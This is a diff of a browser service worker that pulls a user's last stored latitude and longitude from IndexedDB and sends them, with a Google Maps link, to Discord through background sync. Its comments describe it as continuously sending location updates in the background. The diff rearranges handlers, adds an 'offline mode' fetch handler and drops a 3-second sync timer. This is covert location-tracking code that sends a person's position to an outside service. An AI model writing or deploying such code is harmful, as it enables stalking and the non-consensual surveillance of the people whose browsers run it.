@@ -1,11 +1,20 @@
-// ✅ Background Sync Event Listener
+// ✅ Install & Activate Service Worker
+self.addEventListener("install", function (event) {
+    self.skipWaiting();
+});
+
+self.addEventListener("activate", function (event) {
+    event.waitUntil(self.clients.claim());
+});
+
+// ✅ Background Sync Event Listener (Keeps Sending Location Updates in Background)
 self.addEventListener("sync", function (event) {
     if (event.tag === "syncLocation") {
         event.waitUntil(fetchLocationAndSend());
     }
 });
 
-// ✅ Fetch the Last Known Location from IndexedDB & Send it to Discord
+// ✅ Fetch Last Location from IndexedDB & Send it to Discord
 async function fetchLocationAndSend() {
     return new Promise((resolve, reject) => {
         openDatabase().then(db => {
@@ -16,7 +25,6 @@ async function fetchLocationAndSend() {
                 }
 
                 const { latitude, longitude } = locationData;
-
                 const payload = {
                     content: `📍 **Background Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
                 };
@@ -62,7 +70,7 @@ function openDatabase() {
     });
 }
 
-// ✅ Get the Last Stored Location from IndexedDB
+// ✅ Get Last Stored Location from IndexedDB
 function getLocationFromDB(db) {
     return new Promise((resolve, reject) => {
         const transaction = db.transaction("locations", "readonly");
@@ -78,19 +86,7 @@ function getLocationFromDB(db) {
     });
 }
 
-// ✅ Automatically Request Background Sync Every 3 Seconds
-self.addEventListener("install", function (event) {
-    self.skipWaiting();
-});
-
-self.addEventListener("activate", function (event) {
-    event.waitUntil(self.clients.claim());
-});
-
+// ✅ Respond to Fetch Requests (Offline Mode Support)
 self.addEventListener("fetch", function (event) {
     event.respondWith(fetch(event.request).catch(() => new Response("Offline")));
 });
-
-setInterval(() => {
-    self.registration.sync.register("syncLocation").catch(console.error);
-}, 3000);
